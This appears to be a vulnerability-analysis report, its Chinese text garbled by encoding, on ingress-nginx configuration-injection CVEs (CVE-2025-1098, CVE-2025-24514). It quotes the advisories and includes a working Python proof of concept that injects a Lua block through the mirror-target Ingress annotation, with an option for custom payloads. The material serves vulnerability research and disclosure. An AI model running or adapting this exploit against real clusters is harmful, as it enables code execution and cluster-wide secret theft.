6.  **æ³¨æ„**ï¼šæ­¤POCä»…ç”¨äºå®‰å…¨ç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•ã€‚åœ¨çœŸå®ç¯å¢ƒä¸­è¿è¡Œæ­¤è„šæœ¬éœ€è¦æ˜ç¡®æˆæƒã€‚è„šæœ¬ä¸­çš„TLS secret (`poc-tls-secret`) å’ŒåŸŸå (`poc.example.com`) æ˜¯ç¤ºä¾‹æ€§çš„ï¼Œå¯èƒ½éœ€è¦æ ¹æ®å®é™…ç¯å¢ƒè°ƒæ•´æˆ–é¢„å…ˆåˆ›å»ºç›¸åº”èµ„æºã€‚éªŒè¯æ­¥éª¤éœ€è¦æ‰‹åŠ¨æ‰§è¡Œã€‚

---


## Issue #131008 CVE-2025-1098: ingress-nginx controller - configuration injection via unsanitized mirror annotations

- Issue é“¾æ¥ï¼š[#131008](https://github.com/kubernetes/kubernetes/issues/131008)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score: 8.8, High)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where the \`mirror-target\` and \`mirror-host\` Ingress annotations can be used to inject arbitrary configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

##### Fixed Versions

- ingress-nginx [main@2e9f373](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/2e9f37380afb7853fa6daa1c3e6659550aadfd90)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

Suspicious data within the \`mirror-target\` or \`mirror-host\` annotations of an Ingress resource could indicate an attempt to exploit this vulnerability.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik and Hillai Ben Sasson from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueç±»å‹åˆ†æ**: è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªæ˜ç¡®çš„å®‰å…¨æ¼æ´ (CVE-2025-1098)ï¼Œå±äºè½¯ä»¶ç¼ºé™·ç±»å‹ã€‚
2.  **æ¼æ´æè¿°**: æ¼æ´å­˜åœ¨äº `ingress-nginx` ç»„ä»¶ä¸­ï¼Œå…·ä½“æ˜¯ç”±äºå¯¹ Ingress èµ„æºä¸­çš„ `mirror-target` å’Œ `mirror-host` æ³¨è§£ï¼ˆannotationsï¼‰å¤„ç†ä¸å½“ï¼Œæœªèƒ½å……åˆ†å‡€åŒ–ç”¨æˆ·è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„çš„ Nginx é…ç½®ã€‚
3.  **å½±å“**:
    *   **ä»»æ„é…ç½®æ³¨å…¥**: æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ Nginx çš„è¡Œä¸ºã€‚
    *   **ä»»æ„ä»£ç æ‰§è¡Œ**: æ³¨å…¥çš„é…ç½®å¯èƒ½åŒ…å«å…è®¸æ‰§è¡Œä»£ç çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœå¯ç”¨äº† Lua æ¨¡å—ï¼Œå¯ä»¥æ³¨å…¥ Lua ä»£ç ï¼‰ï¼Œä»£ç å°†åœ¨ ingress-nginx controller çš„ Pod å†…æ‰§è¡Œï¼Œå…¶æƒé™é€šå¸¸è¾ƒé«˜ã€‚
    *   **æ•æ„Ÿä¿¡æ¯æ³„éœ²**: æ³¨å…¥çš„é…ç½®å¯ä»¥ç”¨æ¥è¯»å– controller Pod å¯ä»¥è®¿é—®çš„æ–‡ä»¶ï¼Œç‰¹åˆ«æ˜¯ Kubernetes Secretsã€‚æŠ¥å‘Šä¸­æŒ‡å‡ºï¼Œé»˜è®¤å®‰è£…ä¸‹ï¼Œcontroller é€šå¸¸æœ‰æƒé™è®¿é—®é›†ç¾¤èŒƒå›´å†…çš„æ‰€æœ‰ Secretsã€‚
4.  **è§¦å‘æ¡ä»¶**: æ”»å‡»è€…éœ€è¦æ‹¥æœ‰åˆ›å»ºæˆ–ä¿®æ”¹ Ingress èµ„æºçš„æƒé™ï¼ˆ`PR:L` - Low Privileges Requiredï¼‰ã€‚åœ¨å¤šç§Ÿæˆ·æˆ–å…è®¸ç”¨æˆ·ç®¡ç†è‡ªå·±åº”ç”¨çš„ Kubernetes ç¯å¢ƒä¸­ï¼Œè¿™é€šå¸¸æ˜¯æˆäºˆæ™®é€šç”¨æˆ·çš„æƒé™ã€‚
5.  **CVSSè¯„åˆ†**: æŠ¥å‘Šä¸­ç»™å‡ºçš„ CVSS 3.1 è¯„åˆ†ä¸º 8.8 (High)ï¼Œå‘é‡ä¸º `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`ã€‚è¿™è¡¨æ˜æ¼æ´å¯ä»¥è¿œç¨‹åˆ©ç”¨ï¼ˆAV:Nï¼‰ã€åˆ©ç”¨å¤æ‚åº¦ä½ï¼ˆAC:Lï¼‰ã€éœ€è¦ä½æƒé™ï¼ˆPR:Lï¼‰ã€æ— éœ€ç”¨æˆ·äº¤äº’ï¼ˆUI:Nï¼‰ã€ä½œç”¨åŸŸä¸å˜ï¼ˆS:Uï¼‰ï¼Œä½†å¯¹æœºå¯†æ€§ï¼ˆC:Hï¼‰ã€å®Œæ•´æ€§ï¼ˆI:Hï¼‰å’Œå¯ç”¨æ€§ï¼ˆA:Hï¼‰æœ‰é«˜å½±å“ã€‚
6.  **é£é™©åˆ¤æ–­ä¾æ®**:
    *   è¯¥é—®é¢˜æ˜¯æ˜ç¡®çš„å®‰å…¨æ¼æ´ï¼Œä¸æ˜¯ issue æäº¤è€…çš„é—®é¢˜ã€‚
    *   CVSS è¯„åˆ† 8.8ï¼Œå±äº High çº§åˆ«ã€‚
    *   æ¼æ´å¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰å’Œæ•æ„Ÿä¿¡æ¯ï¼ˆé›†ç¾¤èŒƒå›´ Secretsï¼‰æ³„éœ²ï¼Œç¬¦åˆé«˜é£é™©å®šä¹‰ï¼ˆCriterion 7ï¼‰ã€‚
    *   æ¼æ´å‘ç”Ÿåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ï¼ˆKubernetesé›†ç¾¤ï¼‰ï¼Œä½æƒé™ç”¨æˆ·ï¼ˆèƒ½åˆ›å»ºIngressï¼‰å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ”»å‡»å…±äº«çš„ ingress-nginx controllerï¼Œè¿›è€Œå½±å“å…¶ä»–ç”¨æˆ·æˆ–è·å–æ›´é«˜æƒé™ï¼ˆè®¿é—®é›†ç¾¤ Secretsï¼‰ï¼Œç¬¦åˆé«˜é£é™©å®šä¹‰ï¼ˆCriterion 8ï¼‰ã€‚
    *   è™½ç„¶åˆ©ç”¨éœ€è¦ä½æƒé™ï¼ˆ`PR:L`ï¼‰ï¼Œä½†ç”±äºå…¶æ½œåœ¨å½±å“ï¼ˆRCEã€é›†ç¾¤ Secret æ³„éœ²ï¼‰ï¼Œæ ¹æ® Criterion 7 å’Œ 8ï¼Œä»åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
import os
import argparse
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import threading
import logging
import signal

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å…¨å±€å˜é‡å®šä¹‰
NAMESPACE_NAME = "cve-2025-1098-poc-ns"
INGRESS_NAME = "cve-2025-1098-poc-ingress"
# æ¨¡æ‹Ÿçš„æ¶æ„Payloadï¼Œå°è¯•æ³¨å…¥ä¸€ä¸ªLuaå—æ¥è®°å½•æ—¥å¿—ï¼ˆè¡¨æ˜é…ç½®æ³¨å…¥æˆåŠŸï¼‰
# æ³¨æ„ï¼šå®é™…çš„RCEæˆ–ä¿¡æ¯æ³„éœ²payloadä¼šæ›´å¤æ‚
# è¿™ä¸ªpayloadå‡è®¾ç›®æ ‡ingress-nginxå¯ç”¨äº†Luaæ¨¡å—
# å¦‚æœæ²¡æœ‰Luaæ¨¡å—ï¼Œæ³¨å…¥å¯èƒ½å¯¼è‡´Nginxé…ç½®é”™è¯¯ï¼Œä¹Ÿèƒ½é—´æ¥è¯æ˜æ³¨å…¥ï¼Œä½†ä¸ä¼šæ‰§è¡Œä»£ç 
PAYLOAD = "http://dummy.local/; rewrite_by_lua_block { ngx.log(ngx.ERR, \\\"CVE-2025-1098 POC triggered via annotation injection\\\") } -- "
# ä½¿ç”¨ '--' ä½œä¸ºæ³¨é‡Šç¬¦å°è¯•æ³¨é‡Šæ‰åé¢å¯èƒ½è¿½åŠ çš„å­—ç¬¦ï¼Œåˆ†å·ç”¨äºç»“æŸå‰ä¸€ä¸ªæŒ‡ä»¤

DEFAULT_TIMEOUT_SECONDS = 120 # é»˜è®¤è¶…æ—¶æ—¶é—´

# è¶…æ—¶å¤„ç†
class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException("Script execution timed out.")

def create_test_resources(api_instance_core, api_instance_networking, payload):
    """åˆ›å»ºç”¨äºæµ‹è¯•çš„Namespaceå’ŒIngressèµ„æº"""
    # 1. åˆ›å»º Namespace
    namespace_manifest = {
        "apiVersion": "v1",
        "kind": "Namespace",
        "metadata": {"name": NAMESPACE_NAME},
    }
    try:
        logging.info(f"Creating namespace: {NAMESPACE_NAME}")
        api_instance_core.create_namespace(body=namespace_manifest)
        logging.info(f"Namespace '{NAMESPACE_NAME}' created successfully.")
        # ç­‰å¾…namespaceå®é™…å¯ç”¨ï¼ˆå¯é€‰ï¼Œä½†æœ‰åŠ©äºåç»­èµ„æºåˆ›å»ºï¼‰
        time.sleep(5)
    except ApiException as e:
        if e.status == 409: # Conflict, namespace already exists
            logging.warning(f"Namespace '{NAMESPACE_NAME}' already exists. Continuing.")
        else:
            logging.error(f"Error creating namespace: {e}")
            raise

    # 2. åˆ›å»º Ingress
    ingress_manifest = {
        "apiVersion": "networking.k8s.io/v1",
        "kind": "Ingress",
        "metadata": {
            "name": INGRESS_NAME,
            "namespace": NAMESPACE_NAME,
            "annotations": {
                # å…³é”®ï¼šæ³¨å…¥æ¶æ„payloadåˆ°mirror-targetæ³¨è§£
                "nginx.ingress.kubernetes.io/mirror-target": payload,
                # éœ€è¦ä¸€ä¸ªmirroræºæ³¨è§£æ¥å¯ç”¨é•œåƒåŠŸèƒ½
                "nginx.ingress.kubernetes.io/mirror-uri": "/mirror-trigger",
                 # å…¶ä»–å¯èƒ½éœ€è¦çš„æ³¨è§£ï¼Œç¡®ä¿Ingressè¢«æ§åˆ¶å™¨å¤„ç†
                "kubernetes.io/ingress.class": "nginx" # æ ¹æ®å®é™…ç¯å¢ƒå¯èƒ½éœ€è¦è°ƒæ•´
            },
        },
        "spec": {
            "rules": [{
                "host": "cve-poc.example.com",
                "http": {
                    "paths": [{
                        "path": "/",
                        "pathType": "Prefix",
                        "backend": {
                            "service": {
                                "name": "dummy-service", # å¯ä»¥æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æœåŠ¡ï¼Œå› ä¸ºå…³æ³¨ç‚¹æ˜¯æ³¨è§£å¤„ç†
                                "port": {"number": 80},
                            }
                        },
                    }]
                },
            }]
        },
    }
    try:
        logging.info(f"Creating ingress: {INGRESS_NAME} in namespace {NAMESPACE_NAME} with malicious annotation.")
        api_instance_networking.create_namespaced_ingress(
            namespace=NAMESPACE_NAME, body=ingress_manifest
        )
        logging.info(f"Ingress '{INGRESS_NAME}' created successfully.")
        logging.info("Payload injected via 'nginx.ingress.kubernetes.io/mirror-target' annotation.")
        logging.info("If the ingress-nginx controller is vulnerable and processes this Ingress,")
        logging.info("the injected configuration might be active.")
        logging.info("Check the logs of the ingress-nginx controller pod for messages like:")
        logging.info("'CVE-2025-1098 POC triggered via annotation injection' (if Lua is enabled),")
        logging.info("or look for Nginx configuration reload errors related to the injected syntax.")

    except ApiException as e:
        logging.error(f"Error creating ingress: {e}")
        raise
    except Exception as e:
        logging.error(f"An unexpected error occurred during ingress creation: {e}")
        raise

def cleanup_resources(api_instance_core, api_instance_networking):
    """æ¸…ç†æµ‹è¯•åˆ›å»ºçš„èµ„æº"""
    logging.info("Cleaning up resources...")
    try:
        logging.info(f"Deleting ingress: {INGRESS_NAME} in namespace {NAMESPACE_NAME}")
        api_instance_networking.delete_namespaced_ingress(
            name=INGRESS_NAME, namespace=NAMESPACE_NAME, body=client.V1DeleteOptions()
        )
        # ç­‰å¾…Ingressåˆ é™¤å®Œæˆ
        time.sleep(5)
        logging.info(f"Ingress '{INGRESS_NAME}' deleted.")
    except ApiException as e:
        if e.status == 404:
            logging.warning(f"Ingress '{INGRESS_NAME}' not found, might have been deleted already.")
        else:
            logging.error(f"Error deleting ingress: {e}")
            # ç»§ç»­å°è¯•åˆ é™¤namespace

    try:
        logging.info(f"Deleting namespace: {NAMESPACE_NAME}")
        api_instance_core.delete_namespace(name=NAMESPACE_NAME, body=client.V1DeleteOptions())
        logging.info(f"Namespace '{NAMESPACE_NAME}' deletion initiated.")
        # Namespaceåˆ é™¤æ˜¯å¼‚æ­¥çš„ï¼Œè¿™é‡Œä¸ç­‰å¾…å®Œå…¨åˆ é™¤å®Œæˆ
    except ApiException as e:
        if e.status == 404:
            logging.warning(f"Namespace '{NAMESPACE_NAME}' not found, might have been deleted already.")
        else:
            logging.error(f"Error deleting namespace: {e}")

def main():
    parser = argparse.ArgumentParser(description="POC for CVE-2025-1098 - ingress-nginx annotation injection.")
    parser.add_argument("--kubeconfig", help="Path to the kubeconfig file (optional, defaults to ~/.kube/config or KUBECONFIG env var)")
    parser.add_argument("--payload", default=PAYLOAD, help="Custom payload for the mirror-target annotation (use with caution)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT_SECONDS, help=f"Script execution timeout in seconds (default: {DEFAULT_TIMEOUT_SECONDS})")
    args = parser.parse_args()

    # è®¾ç½®æ‰§è¡Œè¶…æ—¶
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(args.timeout)

    try:
        # 1. åŠ è½½ Kubernetes é…ç½®
        try:
            logging.info("Loading Kubernetes configuration...")
            if args.kubeconfig:
                config.load_kube_config(config_file=args.kubeconfig)
            else:
                config.load_kube_config() # ä»é»˜è®¤ä½ç½®åŠ è½½
            logging.info("Kubernetes configuration loaded successfully.")
        except Exception as e:
            logging.error(f"Failed to load Kubernetes configuration: {e}")
            logging.error("Ensure you have a valid kubeconfig file and permissions to create namespaces and ingresses.")
            sys.exit(1)

        # 2. åˆ›å»º Kubernetes API å®¢æˆ·ç«¯
        core_v1 = client.CoreV1Api()
        networking_v1 = client.NetworkingV1Api()

        # 3. æ‰§è¡Œæµ‹è¯•ï¼šåˆ›å»ºèµ„æº
        try:
            create_test_resources(core_v1, networking_v1, args.payload)
            # ç­‰å¾…ä¸€æ®µæ—¶é—´è®©æ§åˆ¶å™¨å¤„ç†Ingressï¼Œæˆ–è¿›è¡Œæ‰‹åŠ¨éªŒè¯
            logging.info(f"Waiting for {args.timeout // 4} seconds to allow controller processing before cleanup...")
            time.sleep(args.timeout // 4)
            logging.info("POC execution finished. Please check controller logs or behavior manually.")
        except Exception as e:
            logging.error(f"An error occurred during resource creation: {e}")
            # å³ä½¿åˆ›å»ºå¤±è´¥ï¼Œä¹Ÿå°è¯•æ¸…ç†
        finally:
            # 4. æ¸…ç†èµ„æº
            cleanup_resources(core_v1, networking_v1)

    except TimeoutException:
        logging.error(f"Script timed out after {args.timeout} seconds.")
        # è¶…æ—¶åå°è¯•å¼ºåˆ¶æ¸…ç†ï¼Œå› ä¸ºå¯èƒ½åœ¨åˆ›å»ºæˆ–åˆ é™¤è¿‡ç¨‹ä¸­å¡ä½
        logging.warning("Attempting cleanup despite timeout...")
        try:
            core_v1_cleanup = client.CoreV1Api()
            networking_v1_cleanup = client.NetworkingV1Api()
            cleanup_resources(core_v1_cleanup, networking_v1_cleanup)
        except Exception as cleanup_e:
            logging.error(f"Error during forced cleanup after timeout: {cleanup_e}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        sys.exit(1)
    finally:
        # å–æ¶ˆè¶…æ—¶å®šæ—¶å™¨
        signal.alarm(0)

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ç‰¹åˆ¶ `nginx.ingress.kubernetes.io/mirror-target` æ³¨è§£çš„ Ingress èµ„æºï¼Œæ¥æ¼”ç¤º CVE-2025-1098 æ¼æ´ã€‚å¦‚æœè¿è¡Œè¯¥è„šæœ¬çš„ Kubernetes é›†ç¾¤ä¸­å­˜åœ¨æ˜“å—æ”»å‡»çš„ `ingress-nginx` ç‰ˆæœ¬ï¼Œå¹¶ä¸”è¯¥æ§åˆ¶å™¨æ­£åœ¨ç›‘è§†æ–°åˆ›å»ºçš„ Ingressï¼Œå®ƒå°†å°è¯•å¤„ç†è¿™ä¸ªåŒ…å«æ¶æ„æ³¨è§£çš„ Ingressã€‚
2.  **å·¥ä½œæµç¨‹**:
    *   **åŠ è½½é…ç½®**: ä½¿ç”¨ `kubernetes` Python åº“åŠ è½½ç”¨æˆ·çš„ Kubernetes é…ç½®ï¼ˆé»˜è®¤ä» `~/.kube/config` æˆ– `KUBECONFIG` ç¯å¢ƒå˜é‡æŒ‡å®šçš„ä½ç½®ï¼‰ã€‚
    *   **åˆ›å»º Namespace**: åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ Namespace (`cve-2025-1098-poc-ns`) ç”¨äºéš”ç¦»æµ‹è¯•èµ„æºã€‚
    *   **æ„é€  Ingress**: å®šä¹‰ä¸€ä¸ª Ingress å¯¹è±¡ï¼Œå…¶å…³é”®åœ¨äº `metadata.annotations` éƒ¨åˆ†ï¼š
        *   `nginx.ingress.kubernetes.io/mirror-target`: è®¾ç½®ä¸º `PAYLOAD` å˜é‡çš„å€¼ã€‚è¿™ä¸ª Payload (`http://dummy.local/; rewrite_by_lua_block { ngx.log(ngx.ERR, \"CVE-2025-1098 POC triggered via annotation injection\") } -- `) å°è¯•æ³¨å…¥ä¸€ä¸ª Nginx é…ç½®ç‰‡æ®µã€‚å®ƒé¦–å…ˆæä¾›ä¸€ä¸ªçœ‹ä¼¼åˆæ³•çš„ URL (è™½ç„¶æ˜¯å‡çš„)ï¼Œç„¶åç”¨åˆ†å· `;` ç»“æŸè¯¥æŒ‡ä»¤ï¼Œæ¥ç€å°è¯•æ’å…¥ä¸€ä¸ª `rewrite_by_lua_block` æŒ‡ä»¤ï¼ˆå¦‚æœ ingress-nginx ç¼–è¯‘äº† Lua æ”¯æŒï¼‰ã€‚è¿™ä¸ª Lua å—è¢«è®¾è®¡ä¸ºåœ¨ Nginx é”™è¯¯æ—¥å¿—ä¸­æ‰“å°ä¸€æ¡ç‰¹å®šæ¶ˆæ¯ã€‚æœ€åçš„ `-- ` å°è¯•æ³¨é‡Šæ‰ä»»ä½•ç”±æ§åˆ¶å™¨è‡ªåŠ¨é™„åŠ çš„åç»­é…ç½®ã€‚
        *   `nginx.ingress.kubernetes.io/mirror-uri`: éœ€è¦è®¾ç½®ä¸€ä¸ªå€¼æ¥å®é™…å¯ç”¨é•œåƒåŠŸèƒ½ï¼Œå¦åˆ™ `mirror-target` å¯èƒ½ä¸ä¼šè¢«å¤„ç†ã€‚
        *   `kubernetes.io/ingress.class`: ç¡®ä¿ Ingress è¢« `nginx` ç±»å‹çš„æ§åˆ¶å™¨å¤„ç†ã€‚
    *   **åˆ›å»º Ingress**: ä½¿ç”¨ Kubernetes API å°†æ„é€ å¥½çš„ Ingress å¯¹è±¡éƒ¨ç½²åˆ°ä¹‹å‰åˆ›å»ºçš„ Namespace ä¸­ã€‚
    *   **ç­‰å¾…ä¸æç¤º**: è„šæœ¬åˆ›å»ºèµ„æºåä¼šæ‰“å°æˆåŠŸä¿¡æ¯ï¼Œå¹¶æç¤ºç”¨æˆ·æ£€æŸ¥ ingress-nginx controller çš„æ—¥å¿—æ¥ç¡®è®¤æ³¨å…¥æ˜¯å¦æˆåŠŸï¼ˆé€šè¿‡æŸ¥æ‰¾ Lua è®°å½•çš„æ¶ˆæ¯æˆ–é…ç½®é”™è¯¯ï¼‰ã€‚è„šæœ¬ä¼šæš‚åœä¸€å°æ®µæ—¶é—´å…è®¸æ§åˆ¶å™¨ååº”ã€‚
    *   **æ¸…ç†**: åœ¨è„šæœ¬æ‰§è¡Œç»“æŸæˆ–å‘ç”Ÿé”™è¯¯æ—¶ï¼ˆé€šè¿‡ `finally` å—ï¼‰ï¼Œå°è¯•åˆ é™¤åˆ›å»ºçš„ Ingress å’Œ Namespaceï¼Œä»¥ä¿æŒç¯å¢ƒæ•´æ´ã€‚
    *   **è¶…æ—¶æœºåˆ¶**: ä½¿ç”¨ `signal.alarm` è®¾ç½®äº†æ‰§è¡Œè¶…æ—¶ï¼ˆé»˜è®¤120ç§’ï¼‰ï¼Œé˜²æ­¢è„šæœ¬å› ç½‘ç»œé—®é¢˜æˆ–APIè°ƒç”¨å¡æ­»è€Œæ— é™æœŸè¿è¡Œã€‚
3.  **éªŒè¯**:
    *   è„šæœ¬æœ¬èº«ä¸ç›´æ¥éªŒè¯æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸï¼ˆä¾‹å¦‚ï¼Œä¸å°è¯• `kubectl exec` è¿›å…¥ Pod æ£€æŸ¥æ—¥å¿—æˆ–æ‰§è¡Œä»£ç ï¼‰ã€‚
    *   ä½¿ç”¨è€…éœ€è¦æ‰‹åŠ¨æ£€æŸ¥ `ingress-nginx-controller` Pod çš„æ—¥å¿—ã€‚å¦‚æœæ¼æ´å­˜åœ¨ä¸”è¢«åˆ©ç”¨ï¼š
        *   å¯èƒ½ä¼šçœ‹åˆ°ç±»ä¼¼ "CVE-2025-1098 POC triggered via annotation injection" çš„é”™è¯¯æ—¥å¿—ï¼ˆå¦‚æœ Lua æ¨¡å—å¯ç”¨ä¸”æ³¨å…¥æˆåŠŸï¼‰ã€‚
        *   æˆ–è€…ï¼Œå¯èƒ½ä¼šçœ‹åˆ° Nginx é…ç½®é‡è½½å¤±è´¥çš„é”™è¯¯æ—¥å¿—ï¼ŒæŒ‡ç¤ºæ³¨å…¥çš„è¯­æ³•ç ´åäº† Nginx é…ç½®ã€‚
        *   æ›´é«˜çº§çš„ Payload å¯èƒ½å°è¯•å°†æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚æœåŠ¡è´¦æˆ·ä»¤ç‰Œï¼‰å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ï¼Œæˆ–æ‰§è¡Œå‘½ä»¤ï¼Œè¿™éœ€è¦æ›´å¤æ‚çš„éªŒè¯æ­¥éª¤ã€‚
4.  **å‡è®¾**:
    *   è„šæœ¬å‡è®¾ç”¨æˆ·å…·æœ‰è¿æ¥åˆ° Kubernetes é›†ç¾¤çš„ `kubeconfig` æ–‡ä»¶ï¼Œå¹¶ä¸”è¯¥é…ç½®å…·æœ‰åˆ›å»º Namespace å’Œ Ingress èµ„æºçš„æƒé™ã€‚
    *   è„šæœ¬å‡è®¾é›†ç¾¤ä¸­è¿è¡Œç€ä¸€ä¸ªæ˜“å— CVE-2025-1098 å½±å“çš„ `ingress-nginx` æ§åˆ¶å™¨å®ä¾‹ï¼Œå¹¶ä¸”è¯¥æ§åˆ¶å™¨é…ç½®ä¸ºå¤„ç†å¸¦æœ‰ `kubernetes.io/ingress.class: nginx` æ³¨è§£çš„ Ingressã€‚
    *   è„šæœ¬ä½¿ç”¨çš„ Payload ä¾èµ–äº Lua æ¨¡å—çš„å­˜åœ¨æ¥è®°å½•æ¶ˆæ¯ï¼›å¦‚æœ Lua æœªå¯ç”¨ï¼Œæ³¨å…¥å¯èƒ½ä»ä¼šå‘ç”Ÿä½†è¡¨ç°ä¸ºé…ç½®é”™è¯¯ã€‚
5.  **å®‰å…¨æ€§**: æ­¤è„šæœ¬ä»…ç”¨äºæ•™è‚²å’Œæœ¬åœ°æµ‹è¯•ç›®çš„ï¼Œä»¥æ¼”ç¤ºæ¼æ´çš„å­˜åœ¨ã€‚Payload æœ¬èº«è®¾è®¡ä¸ºç›¸å¯¹æ— å®³ï¼ˆä»…è®°å½•æ—¥å¿—ï¼‰ï¼Œä½†ä¿®æ”¹ Payload å¯èƒ½å¯¼è‡´å®é™…å±å®³ã€‚è¯·å‹¿åœ¨æœªç»æˆæƒçš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚

---


## Issue #131006 CVE-2025-24514: ingress-nginx controller - configuration injection via unsanitized auth-url annotation

- Issue é“¾æ¥ï¼š[#131006](https://github.com/kubernetes/kubernetes/issues/131006)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score: 8.8, High)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where the \`auth-url\` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

This issue does not affect you if you have the \`enable-annotation-validation\` CLI argument enabled. (This option is enabled by default starting from ingress-nginx v1.12.0.)

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

Prior to upgrading, this vulnerability can be mitigated by setting the \`enable-annotation-validation\` CLI argument to â€œtrueâ€.

##### Fixed Versions

- ingress-nginx [main@ab470eb](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/ab470eb920924d62a197ebddd8a4cc3031a77ddf)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

Suspicious data within the \`auth-url\` annotation of an Ingress resource could indicate an attempt to exploit this vulnerability.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin and Sagi Tzadik from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issue ç±»å‹**: è¯¥ Issue æè¿°äº†ä¸€ä¸ªå·²ç¡®è®¤çš„å®‰å…¨æ¼æ´ (CVE-2025-24514)ï¼Œå¹¶éåŠŸèƒ½ Bug æˆ–æ™®é€šå’¨è¯¢ã€‚
2.  **æ¼æ´æè¿°**: æ¼æ´å­˜åœ¨äº Kubernetes çš„ ingress-nginx æ§åˆ¶å™¨ä¸­ã€‚å…·ä½“æ¥è¯´ï¼Œ`nginx.ingress.kubernetes.io/auth-url` è¿™ä¸ª Ingress Annotation æœªç»å……åˆ†å‡€åŒ–(unsanitized)ï¼Œå…è®¸æ”»å‡»è€…æ³¨å…¥ Nginx é…ç½®ã€‚
3.  **æ½œåœ¨å½±å“**:
    *   **é…ç½®æ³¨å…¥**: æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ Nginx çš„è¡Œä¸ºã€‚
    *   **ä»»æ„ä»£ç æ‰§è¡Œ (RCE)**: æ³¨å…¥çš„é…ç½®å¯èƒ½å¯¼è‡´åœ¨ ingress-nginx controller Pod çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™æ˜¯æœ€é«˜é£é™©çš„å½±å“ä¹‹ä¸€ã€‚
